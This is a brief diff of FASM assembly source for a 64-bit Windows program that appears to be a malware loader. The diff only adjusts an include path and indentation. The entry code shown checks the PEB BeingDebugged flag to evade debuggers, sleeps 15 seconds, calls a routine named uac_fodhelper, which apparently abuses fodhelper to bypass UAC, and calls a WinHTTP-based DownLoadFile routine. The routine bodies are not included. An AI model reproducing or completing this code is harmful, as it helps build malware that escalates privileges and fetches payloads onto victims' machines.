@@ -1,6 +1,6 @@
 format PE64 GUI
 entry start
-include 'C:\FLAT\INCLUDE\win64a.inc'
+include 'win64a.inc'
 
 WINHTTP_ACCESS_TYPE_NO_PROXY = 0
 WINHTTP_FLAG_SECURE          = 0x00800000
@@ -10,13 +10,14 @@ REG_SZ                   = 1
 
 section '.text' code readable executable
 start:
-    mov rax, [gs:60h]
-    cmp byte[rax+2], 1
-    je debug_opcode
+
+mov rax, [gs:60h]
+cmp byte[rax+2], 1
+je debug_opcode
     
-   invoke Sleep, 15000
-   call uac_fodhelper 
-  call DownLoadFile
+invoke Sleep, 15000
+call uac_fodhelper 
+call DownLoadFile
     
     
     
